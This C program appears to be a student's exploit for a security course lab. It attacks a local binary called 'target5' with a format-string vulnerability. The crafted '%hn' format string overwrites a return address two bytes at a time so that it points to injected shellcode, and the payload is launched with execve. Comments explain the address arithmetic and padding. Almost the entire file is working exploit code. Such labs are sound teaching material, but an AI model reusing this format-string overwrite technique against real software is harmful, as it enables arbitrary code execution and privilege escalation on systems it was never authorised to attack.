#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "shellcode.h"

#define TARGET "../targets/target5"

int
main(const int argc, const char * argv[])
{   
    // These are the addresses (in 2 byte increments) I want to write to:
    // "\xc8\x0e\x82\x56\x00\x00\x00\x00"
    // "    \xca\x0e\x82\x56\x00\x00\x00\x00"

    char payload[256];

    // Format string is 32 chars long (includes null terminator).
    // Format string writes 2 bytes at a time. Each time I print out enough characters
    // using %{number}x so that I get the desired value for writing the 2 bytes.
    // Note that I'm only writing from the bottom 2 bytes of the number of chars printed
    // out's hex value.

    // The format string write 0x56820ce0 (address of return address) to the return address.
    // We want to write to alignedBuffer, because that is where the shellcode will be stored.

    // 31 chars + nullbyte => 32 bytes => 8-byte aligned
    char format_string[] = 
            "aaaaaa%3290x%10$hn%18850x%11$hn";
    
    // Empty strings are used to add 0 byte paddings to the upper 32 bits for return addresses.
    // Shellcode is put at the end of the payload so that its length doesn't
    // affect the validity of the format string and, effectively, the overall payload.
	char * args[] = { format_string, "\xc8\x0e\x82\x56","","","","\xca\x0e\x82\x56","","","",shellcode, NULL };
	char * env[] = { NULL };

	execve(TARGET, args, env);

	printf("ERROR: execve failed.\n");
	return(-1);
}